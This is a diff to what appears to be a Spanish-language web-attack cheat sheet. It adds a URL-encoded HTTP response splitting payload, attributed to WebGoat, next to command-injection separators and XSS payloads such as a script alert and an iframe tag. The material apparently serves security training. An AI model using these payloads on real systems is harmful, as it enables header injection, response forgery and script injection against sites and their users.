@@ -35,6 +35,11 @@ Al poder subir archivos, si podemos elegir el nombre del archivo y no se chequea
 
 Command Injection -> ; [Comando]
 			& [Comando]
+			
+			
+HTTP Split Attack ->
+			asdf%0AContent-Length%3A%200%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2050%0A%3Chtml%3E%20Prueba%20de%20Concepto%20%3C%2Fhtml%3E
+			Decodearlo para ver contenido (Webgoat)
 
 XSS -> <script>alert("HOLA");</script>
         <iframe src=http://URL A MOSTRARx></script>
